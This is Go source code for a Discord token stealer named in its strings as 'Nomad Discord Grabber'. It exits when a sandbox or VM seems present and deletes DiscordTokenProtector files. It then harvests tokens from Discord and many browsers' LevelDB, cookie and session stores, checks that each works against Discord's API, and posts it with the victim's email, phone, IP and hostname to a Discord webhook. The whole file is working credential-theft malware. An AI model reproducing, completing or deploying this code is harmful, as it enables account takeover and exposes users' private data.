package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"
)

var g_verbose = false
var g_anti_vm = true
var g_webhookURL = "https://discord.com/api/webhooks/INSERT_WEBHOOK_URL_HERE"

const (
	TOKEN_SCAN_TIMEOUT   = 30 * time.Second
	MAX_CONCURRENT_FILES = 20
)

type DiscordUser struct {
	ID            string `json:"id"`
	Username      string `json:"username"`
	Discriminator string `json:"discriminator"`
	Avatar        string `json:"avatar"`
	Email         string `json:"email"`
	Phone         string `json:"phone"`
	Nitro         int    `json:"premium_type"`
	Flags         int    `json:"flags"`
}

type DiscordGuild struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Icon        string `json:"icon"`
	Owner       bool   `json:"owner"`
	Permissions string `json:"permissions"`
}

type WebhookEmbed struct {
	Title       string              `json:"title"`
	Description string              `json:"description"`
	Color       int                 `json:"color"`
	Fields      []WebhookEmbedField `json:"fields"`
	Thumbnail   *WebhookThumbnail   `json:"thumbnail,omitempty"`
	Author      *WebhookAuthor      `json:"author,omitempty"`
	Footer      *WebhookFooter      `json:"footer,omitempty"`
	Timestamp   string              `json:"timestamp,omitempty"`
}

type WebhookEmbedField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline,omitempty"`
}

type WebhookThumbnail struct {
	URL string `json:"url"`
}

type WebhookAuthor struct {
	Name    string `json:"name"`
	IconURL string `json:"icon_url,omitempty"`
}

type WebhookFooter struct {
	Text    string `json:"text"`
	IconURL string `json:"icon_url,omitempty"`
}

type WebhookMessage struct {
	Content   string         `json:"content,omitempty"`
	Embeds    []WebhookEmbed `json:"embeds"`
	Username  string         `json:"username,omitempty"`
	AvatarURL string         `json:"avatar_url,omitempty"`
}

func GetAppDataPath() string {
	return os.Getenv("APPDATA")
}

func GetLocalAppDataPath() string {
	return os.Getenv("LOCALAPPDATA")
}

func GetTempPath() string {
	return os.Getenv("TEMP")
}

func Log(format string, args ...interface{}) {
	if g_verbose {
		timestamp := time.Now().Format("15:04:05")
		fmt.Printf("[%s] "+format+"\n", append([]interface{}{timestamp}, args...)...)
	}
}

func GetDiscordUserInfo(token string) (*DiscordUser, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Authorization", token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("status code: %d", resp.StatusCode)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var user DiscordUser
	err = json.Unmarshal(body, &user)
	if err != nil {
		return nil, err
	}

	return &user, nil
}

func GetUserBadges(flags int) string {
	badges := []string{}

	if flags&1<<0 != 0 {
		badges = append(badges, "Discord Employee")
	}
	if flags&1<<1 != 0 {
		badges = append(badges, "Discord Partner")
	}
	if flags&1<<2 != 0 {
		badges = append(badges, "HypeSquad Events")
	}
	if flags&1<<3 != 0 {
		badges = append(badges, "Bug Hunter Level 1")
	}
	if flags&1<<6 != 0 {
		badges = append(badges, "House Bravery")
	}
	if flags&1<<7 != 0 {
		badges = append(badges, "House Brilliance")
	}
	if flags&1<<8 != 0 {
		badges = append(badges, "House Balance")
	}
	if flags&1<<9 != 0 {
		badges = append(badges, "Early Supporter")
	}
	if flags&1<<10 != 0 {
		badges = append(badges, "Bug Hunter Level 2")
	}
	if flags&1<<11 != 0 {
		badges = append(badges, "Verified Bot Developer")
	}
	if flags&1<<12 != 0 {
		badges = append(badges, "Active Developer")
	}
	if flags&1<<14 != 0 {
		badges = append(badges, "Certified Moderator")
	}

	if len(badges) == 0 {
		badges = append(badges, "No Badges")
	}

	return strings.Join(badges, ", ")
}

func GetNitroLevel(premiumType int) string {
	switch premiumType {
	case 1:
		return "Nitro Classic"
	case 2:
		return "Nitro Boost"
	default:
		return "No Nitro"
	}
}

func GetAvatarURL(userID, avatarHash string) string {
	if avatarHash == "" {
		return "https://cdn.discordapp.com/embed/avatars/0.png"
	}
	return fmt.Sprintf("https://cdn.discordapp.com/avatars/%s/%s.png", userID, avatarHash)
}

func GetMachineIP() string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ipify.org?format=text")
	if err != nil {
		return "Unable to get IP"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "Unable to get IP"
	}

	return string(body)
}

func GetComputerName() string {
	name, err := os.Hostname()
	if err != nil {
		return "Unknown"
	}
	return name
}

func getHostname() string {
	name, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return name
}

func getUsername() string {
	return os.Getenv("USERNAME")
}

func validateRuntimeEnvironment() bool {
	if !g_anti_vm {
		return false
	}

	hostname := strings.ToLower(getHostname())
	suspiciousNames := []string{
		"sandbox", "virus", "malware", "analysis", "cuckoo", "forensic",
		"vmware", "virtualbox", "qemu", "vbox", "xen", "parallels",
	}
	for _, name := range suspiciousNames {
		if strings.Contains(hostname, name) {
			return true
		}
	}

	username := strings.ToLower(getUsername())
	suspiciousUsers := []string{
		"sandbox", "virus", "malware", "analysis", "cuckoo", "forensic",
		"vmware", "virtualbox", "qemu", "currentuser", "test", "user",
	}
	for _, name := range suspiciousUsers {
		if strings.Contains(username, name) {
			return true
		}
	}

	return false
}

func SendTokenToWebhook(token string, userInfo *DiscordUser) error {
	machineIP := GetMachineIP()
	computerName := GetComputerName()

	phoneValue := "Not verified"
	if userInfo.Phone != "" {
		phoneValue = userInfo.Phone
	}
	emailValue := "Not verified"
	if userInfo.Email != "" {
		emailValue = userInfo.Email
	}

	embed := WebhookEmbed{
		Title:       "Discord Data - Nomad Discord Grabber",
		Color:       0x5865F2,
		Description: fmt.Sprintf("**%s**", userInfo.Username),
		Thumbnail: &WebhookThumbnail{
			URL: GetAvatarURL(userInfo.ID, userInfo.Avatar),
		},
		Author: &WebhookAuthor{
			Name:    userInfo.Username,
			IconURL: GetAvatarURL(userInfo.ID, userInfo.Avatar),
		},
		Footer: &WebhookFooter{
			Text:    "Nomad Discord Grabber",
			IconURL: "https://cdn.discordapp.com/emojis/890324567892345678.png",
		},
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Fields: []WebhookEmbedField{
			{
				Name:   "Username",
				Value:  fmt.Sprintf("@%s", userInfo.Username),
				Inline: true,
			},
			{
				Name:   "Machine IP",
				Value:  fmt.Sprintf("`%s` | `%s`", machineIP, computerName),
				Inline: true,
			},
			{
				Name:   "Nitro",
				Value:  GetNitroLevel(userInfo.Nitro),
				Inline: true,
			},
			{
				Name:   "Badges",
				Value:  GetUserBadges(userInfo.Flags),
				Inline: false,
			},
			{
				Name:   "Phone Number",
				Value:  phoneValue,
				Inline: true,
			},
			{
				Name:   "Email",
				Value:  emailValue,
				Inline: true,
			},
			{
				Name:   "Token",
				Value:  fmt.Sprintf("||`%s`||", token),
				Inline: false,
			},
		},
	}

	message := WebhookMessage{
		Embeds: []WebhookEmbed{embed},
	}

	jsonData, err := json.Marshal(message)
	if err != nil {
		return err
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Post(g_webhookURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 && resp.StatusCode != 204 {
		return fmt.Errorf("webhook returned status: %d", resp.StatusCode)
	}

	return nil
}

func manageSecurityServices() {
	Log("\nremoving security services...")
	protectorPath := filepath.Join(GetAppDataPath(), "DiscordTokenProtector")
	files := []string{"DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"}

	for _, file := range files {
		fullPath := filepath.Join(protectorPath, file)
		if err := os.Remove(fullPath); err != nil {
			if !os.IsNotExist(err) {
				Log("error removing %s: %v", file, err)
			}
		} else {
			Log("removed: %s", fullPath)
		}
	}
}

func FindTokensInChunk(data []byte, masterKey []byte) []string {
	tokens := []string{}

	dataStr := string(data)

	parts := strings.FieldsFunc(dataStr, func(r rune) bool {
		return r == '"' || r == '\'' || r == ' ' || r == '\n' || r == '\r' || r == '\t'
	})

	for _, part := range parts {

		if len(part) >= 50 && len(part) <= 100 && strings.Contains(part, ".") {
			if strings.Count(part, ".") == 2 {
				tokens = append(tokens, part)
			}
		}
	}

	return tokens
}

func IsTokenWorkingFast(token string) bool {
	client := &http.Client{Timeout: 5 * time.Second}
	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
	if err != nil {
		return false
	}

	req.Header.Set("Authorization", token)

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == 200
}

func collectAndSendTokens() []string {
	Log("\ngrabbings discord tokens...")
	roaming := GetAppDataPath()
	local := GetLocalAppDataPath()

	type PathEntry struct {
		Name      string
		Path      string
		IsDiscord bool
		MasterKey []byte
		Priority  int
	}
	var paths []PathEntry
	Log("PRIORITY 1: scanning Discord app directories...")

	discordPaths := []string{"discord", "discordcanary", "discordptb", "discorddevelopment"}
	discordPathVariants := []string{
		filepath.Join(roaming, "discord"),
		filepath.Join(roaming, "discordcanary"),
		filepath.Join(roaming, "discordptb"),
		filepath.Join(roaming, "discorddevelopment"),
		filepath.Join(local, "discord"),
		filepath.Join(local, "discordcanary"),
		filepath.Join(local, "discordptb"),
		filepath.Join(local, "discorddevelopment"),
		filepath.Join(local, "Discord"),
	}
	for _, dp := range discordPaths {
		found := false
		for _, basePath := range discordPathVariants {
			Log("  checking %s in %s...", dp, filepath.Base(basePath))
			levelDBPath := filepath.Join(basePath, "Local Storage", "leveldb")
			if info, err := os.Stat(levelDBPath); err == nil && info.IsDir() {
				masterKey := []byte{}
				localStatePath := filepath.Join(basePath, "Local State")
				if data, err := ioutil.ReadFile(localStatePath); err == nil {
					masterKey = extractDiscordMasterKey(data)
					if masterKey == nil {
						masterKey = []byte("dummy_key")
					}
				}
				paths = append(paths, PathEntry{
					Name:      dp,
					Path:      levelDBPath,
					IsDiscord: true,
					MasterKey: masterKey,
					Priority:  1,
				})
				Log("  found %s", dp)
				found = true
				break
			}
		}
		if !found {
			Log("  %s not found", dp)
		}
	}

	programData := os.Getenv("ProgramData")
	if programData != "" {
		for _, dp := range discordPaths {
			Log("  checking %s in ProgramData...", dp)
			discordPath := filepath.Join(programData, dp, "Local Storage", "leveldb")
			if info, err := os.Stat(discordPath); err == nil && info.IsDir() {
				paths = append(paths, PathEntry{Name: dp + "-ProgramData", Path: discordPath, IsDiscord: true, Priority: 1})
				Log("  found %s-ProgramData", dp)
			} else {
				Log("  %s-ProgramData not found", dp)
			}
		}
	}

	Log("PRIORITY 2: scanning Chrome directories...")

	chromeProfiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3"}
	for _, profile := range chromeProfiles {
		Log("  checking Chrome %s LevelDB...", profile)
		levelDBPath := filepath.Join(local, "Google\\Chrome", "User Data", profile, "Local Storage", "leveldb")
		if info, err := os.Stat(levelDBPath); err == nil && info.IsDir() {
			paths = append(paths, PathEntry{Name: fmt.Sprintf("Chrome-%s", profile), Path: levelDBPath, Priority: 2})
			Log("  found Chrome %s LevelDB", profile)
		} else {
			Log("  Chrome %s LevelDB not found", profile)
		}

		Log("  checking Chrome %s Cookies...", profile)
		cookiesPath := filepath.Join(local, "Google\\Chrome", "User Data", profile, "Network", "Cookies")
		if _, err := os.Stat(cookiesPath); err == nil {
			paths = append(paths, PathEntry{Name: fmt.Sprintf("Chrome-%s-Cookies", profile), Path: cookiesPath, Priority: 2})
			Log("  found Chrome %s Cookies", profile)
		} else {
			Log("  Chrome %s Cookies not found", profile)
		}
	}

	Log("PRIORITY 3: scanning Edge directories...")

	edgeProfiles := []string{"Default", "Profile 1", "Profile 2"}
	for _, profile := range edgeProfiles {

		Log("  checking Edge %s LevelDB...", profile)
		levelDBPath := filepath.Join(local, "Microsoft\\Edge", "User Data", profile, "Local Storage", "leveldb")
		if info, err := os.Stat(levelDBPath); err == nil && info.IsDir() {
			paths = append(paths, PathEntry{Name: fmt.Sprintf("Edge-%s", profile), Path: levelDBPath, Priority: 3})
			Log("  found Edge %s LevelDB", profile)
		} else {
			Log("  Edge %s LevelDB not found", profile)
		}

		Log("  checking Edge %s Cookies...", profile)
		cookiesPath := filepath.Join(local, "Microsoft\\Edge", "User Data", profile, "Network", "Cookies")
		if _, err := os.Stat(cookiesPath); err == nil {
			paths = append(paths, PathEntry{Name: fmt.Sprintf("Edge-%s-Cookies", profile), Path: cookiesPath, Priority: 3})
			Log("  found Edge %s Cookies", profile)
		} else {
			Log("  Edge %s Cookies not found", profile)
		}
	}

	Log("PRIORITY 4: scanning Firefox directories...")

	firefoxProfiles, _ := filepath.Glob(filepath.Join(roaming, "Mozilla\\Firefox", "Profiles", "*"))
	for _, profile := range firefoxProfiles {
		profileName := filepath.Base(profile)
		Log("  checking Firefox %s...", profileName)
		if info, err := os.Stat(profile); err == nil && info.IsDir() {
			cookiesPath := filepath.Join(profile, "cookies.sqlite")
			if _, err := os.Stat(cookiesPath); err == nil {
				paths = append(paths, PathEntry{Name: "Firefox-" + profileName, Path: profile, Priority: 4})
				Log("  found Firefox %s", profileName)
			} else {
				Log("  Firefox %s cookies not found", profileName)
			}
		} else {
			Log("  Firefox %s directory not found", profileName)
		}
	}

	Log("PRIORITY 5: scanning other browsers...")

	otherBrowsers := []struct {
		name string
		base string
	}{
		{"Opera", "Opera Software\\Opera Stable"},
		{"Opera GX", "Opera Software\\Opera GX Stable"},
		{"Opera Beta", "Opera Software\\Opera Beta"},
		{"Brave", "BraveSoftware\\Brave-Browser"},
		{"Brave Beta", "BraveSoftware\\Brave-Browser Beta"},
		{"Brave Nightly", "BraveSoftware\\Brave-Browser Nightly"},
		{"Vivaldi", "Vivaldi"},
		{"Yandex", "Yandex\\YandexBrowser"},
		{"CocCoc", "CocCoc\\Browser"},
		{"Chromium", "Chromium"},
		{"360 Browser", "360Browser\\Browser"},
		{"Chrome Beta", "Google\\Chrome Beta"},
		{"Chrome Dev", "Google\\Chrome Dev"},
		{"Chrome Canary", "Google\\Chrome SxS"},
	}

	for _, browser := range otherBrowsers {
		Log("  checking %s LevelDB...", browser.name)
		fullPath := filepath.Join(local, browser.base, "User Data", "Default", "Local Storage", "leveldb")
		if info, err := os.Stat(fullPath); err == nil && info.IsDir() {
			paths = append(paths, PathEntry{Name: browser.name, Path: fullPath, Priority: 5})
			Log("  found %s LevelDB", browser.name)
		} else {
			Log("  %s LevelDB not found", browser.name)
		}

		Log("  checking %s Cookies...", browser.name)
		cookiesPath := filepath.Join(local, browser.base, "User Data", "Default", "Network", "Cookies")
		if _, err := os.Stat(cookiesPath); err == nil {
			paths = append(paths, PathEntry{Name: browser.name + "-Cookies", Path: cookiesPath, Priority: 5})
			Log("  found %s Cookies", browser.name)
		} else {
			Log("  %s Cookies not found", browser.name)
		}

		Log("  checking %s Session Storage...", browser.name)
		sessionPath := filepath.Join(local, browser.base, "User Data", "Default", "Session Storage")
		if info, err := os.Stat(sessionPath); err == nil && info.IsDir() {
			paths = append(paths, PathEntry{Name: browser.name + "-Session", Path: sessionPath, Priority: 5})
			Log("  found %s Session Storage", browser.name)
		} else {
			Log("  %s Session Storage not found", browser.name)
		}
	}

	sort.Slice(paths, func(i, j int) bool {
		return paths[i].Priority < paths[j].Priority
	})

	Log("total locations to scan: %d\n", len(paths))

	tokens := []string{}
	seenTokens := make(map[string]bool)
	var tokensMutex sync.Mutex

	timeout := time.After(TOKEN_SCAN_TIMEOUT)
	done := make(chan bool)

	go func() {
		var wg sync.WaitGroup
		sem := make(chan struct{}, MAX_CONCURRENT_FILES)

		for _, entry := range paths {
			files := []string{}

			if strings.Contains(entry.Path, "leveldb") {
				ldbFiles, _ := filepath.Glob(filepath.Join(entry.Path, "*.ldb"))
				logFiles, _ := filepath.Glob(filepath.Join(entry.Path, "*.log"))
				files = append(files, ldbFiles...)
				files = append(files, logFiles...)
			} else if strings.HasSuffix(entry.Path, "Cookies") {
				files = append(files, entry.Path)
			} else {
				filepath.Walk(entry.Path, func(path string, info os.FileInfo, err error) error {
					if err == nil && !info.IsDir() {
						files = append(files, path)
					}
					return nil
				})
			}

			sort.Slice(files, func(i, j int) bool {
				infoI, _ := os.Stat(files[i])
				infoJ, _ := os.Stat(files[j])
				return infoI.Size() > infoJ.Size()
			})

			for _, file := range files {
				fileInfo, err := os.Stat(file)
				if err != nil || fileInfo.Size() > 50*1024*1024 || fileInfo.Size() < 100 {
					continue
				}

				wg.Add(1)
				sem <- struct{}{}

				go func(filePath, browserName string, isDiscord bool, masterKey []byte) {
					defer wg.Done()
					defer func() { <-sem }()

					select {
					case <-timeout:
						return
					default:
					}

					data, err := ioutil.ReadFile(filePath)
					if err != nil {
						return
					}

					if len(data) > 10*1024*1024 {
						data = data[:10*1024*1024]
					}

					foundTokens := []string{}
					foundTokens = append(foundTokens, FindTokensInChunk(data, masterKey)...)

					if strings.HasSuffix(filePath, "Cookies") || strings.HasSuffix(filePath, "cookies.sqlite") {
						cookieTokens := ExtractTokensFromCookies(data)
						foundTokens = append(foundTokens, cookieTokens...)
					}

					if len(foundTokens) > 0 {
						tokensMutex.Lock()
						for _, token := range foundTokens {
							if !seenTokens[token] && IsTokenWorkingFast(token) {
								seenTokens[token] = true
								tokens = append(tokens, token)
								Log("found valid token from %s: %s...", browserName, token[:20])
							}
						}
						tokensMutex.Unlock()
					}
				}(file, entry.Name, entry.IsDiscord, entry.MasterKey)
			}
		}

		wg.Wait()
		done <- true
	}()

	select {
	case <-done:
	case <-timeout:
		Log("timeout reached during token scanning")
	}

	uniqueTokens := []string{}
	seenFinal := make(map[string]bool)
	for _, token := range tokens {
		if !seenFinal[token] {
			seenFinal[token] = true
			uniqueTokens = append(uniqueTokens, token)
		}
	}
	tokens = uniqueTokens

	Log("found %d valid discord tokens", len(tokens))

	for i, token := range tokens {
		Log("sending token %d/%d...", i+1, len(tokens))

		userInfo, err := GetDiscordUserInfo(token)
		if err != nil {
			Log("error retrieving info for token %d: %v", i+1, err)
			continue
		}

		err = SendTokenToWebhook(token, userInfo)
		if err != nil {
			Log("error sending token %d: %v", i+1, err)
		} else {
			Log("token %d sent successfully!", i+1)
		}

		time.Sleep(500 * time.Millisecond)
	}

	return tokens
}

func extractDiscordMasterKey(data []byte) []byte {
	var result map[string]interface{}
	json.Unmarshal(data, &result)

	if osCrypt, ok := result["os_crypt"].(map[string]interface{}); ok {
		if encryptedKey, ok := osCrypt["encrypted_key"].(string); ok {
			decoded, err := base64.StdEncoding.DecodeString(encryptedKey)
			if err == nil && len(decoded) > 5 {
				return decoded[5:]
			}
		}
	}
	return nil
}

func ExtractTokensFromCookies(data []byte) []string {
	tokens := []string{}
	tokenRegex := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}`)
	twoFactorRegex := regexp.MustCompile(`mfa\.[\w-]{84}`)

	if strings.Contains(string(data), "discord.com") {
		matches := tokenRegex.FindAllString(string(data), -1)
		tokens = append(tokens, matches...)

		mfaMatches := twoFactorRegex.FindAllString(string(data), -1)
		for _, mfaToken := range mfaMatches {
			tokens = append(tokens, mfaToken)
		}
	}

	return tokens
}

func main() {
	if validateRuntimeEnvironment() {
		os.Exit(1)
	}

	manageSecurityServices()

	collectAndSendTokens()

	os.Exit(0)
}
